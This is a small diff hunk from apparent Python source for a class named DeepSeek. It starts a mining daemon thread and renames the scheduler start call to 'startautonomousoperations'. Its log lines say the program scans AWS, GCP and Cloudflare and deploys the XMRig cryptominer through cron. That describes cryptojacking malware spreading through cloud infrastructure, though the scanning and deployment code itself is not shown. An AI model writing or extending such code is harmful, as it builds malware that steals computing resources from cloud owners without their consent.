@@ -10516,7 +10516,7 @@ class DeepSeek:
             threading.Thread(target=mining_daemon, daemon=True).start()
             
             if self.scheduler:
-                self.scheduler.start()
+                self.scheduler.startautonomousoperations()
             
             logger.info("✅ DeepSeek PRODUCTION FULLY OPERATIONAL")
             logger.info("🎯 Scans AWS/GCP/Cloudflare → Deploys XMRig cron")
